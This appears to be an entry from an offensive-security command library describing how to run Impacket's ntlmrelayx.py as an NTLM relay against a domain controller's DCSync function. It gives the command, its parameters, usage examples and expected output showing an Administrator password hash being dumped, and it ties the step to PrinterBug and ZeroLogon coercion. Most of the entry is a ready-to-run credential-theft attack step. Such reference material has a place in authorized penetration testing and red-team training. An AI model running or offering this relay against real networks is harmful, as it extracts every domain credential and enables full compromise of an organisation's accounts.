---
id: c54e5794-437b-4bf0-ab3c-6ff3b7d9379e
name: ntlmrelayx-setup-with-dcsync
type: command
executor: bash
data: 'ntlmrelayx.py -t dcsync://$_TARGET_DC_FQDN -smb2support'
output: null
created_at: '2023-04-06T03:56:02.745372+00:00'
updated_at: '2023-04-10T20:36:02.527266+00:00'
platforms:
  - Linux
tags:
  - credential-access
  - ntlm-relay
verified: true
validated: true
---

# ntlmrelayx-setup-with-dcsync

## Command

```bash
ntlmrelayx.py -t dcsync://$_TARGET_DC_FQDN -smb2support
```

## Description

This command sets up an NTLM relay server using Impacket's ntlmrelayx.py, targeting a Domain Controller for DCSync to extract all domain credentials upon receiving a relayed authentication. It's used in conjunction with exploits like PrinterBug to capture high-privilege NTLM hashes.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -t dcsync://$_TARGET_DC_FQDN | Target for relayed auth: DCSync URI with DC fully qualified domain name (e.g., DC01.lab.local) | Yes |
| -smb2support | Enable SMBv2 protocol support for compatibility with modern Windows | Yes |

## Examples

### Basic Usage

```bash
ntlmrelayx.py -t dcsync://DC01.lab.local -smb2support
```

### Advanced Usage

```bash
ntlmrelayx.py -t dcsync://DC01.lab.local -smb2support --no-http-server
```

(Disable HTTP server if only SMB relay is needed.)

## Expected Output

```
Impacket v0.9.24 - Copyright 2020 SecureAuth Corporation

[*] Servers started, waiting for connections
[*] [SMB] Received connection from 10.10.10.10, attacking target dcsync://DC01.lab.local
[*] DCSync: Extracting credentials for user: Administrator
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

Success shows relayed connections and dumped NTLM hashes (e.g., krbtgt and admin accounts).

## Related

- [[Related Procedure: Exploit-ZeroLogon-and-PrinterBug-for-DC-System-Access]]
